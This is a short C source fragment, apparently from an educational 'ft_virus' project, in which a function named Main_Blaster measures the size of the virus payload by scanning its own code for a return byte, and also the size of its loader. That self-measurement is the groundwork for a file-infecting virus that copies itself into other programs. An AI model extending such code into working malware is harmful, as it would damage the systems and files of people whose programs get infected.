#include "ft_virus.h"

void		Main_Blaster ( void )
{
	/* -- Get size of viruses. (PAYLOAD) -- */
	uint32_t 	size = ((uint32_t)&Blaster_end - (uint32_t)&Blaster_start);	
	unsigned char *p = (unsigned char*)&Blaster_end;
	for( ; ; ++p, ++size) {
		if (*p == 0XC3) { ++size; break; }
	}

	/* -- Get size of loader. -- */
	uint32_t	__attribute__((unused)) size_loader = ((uint32_t)&Blaster_start - (uint32_t)&loader);
}
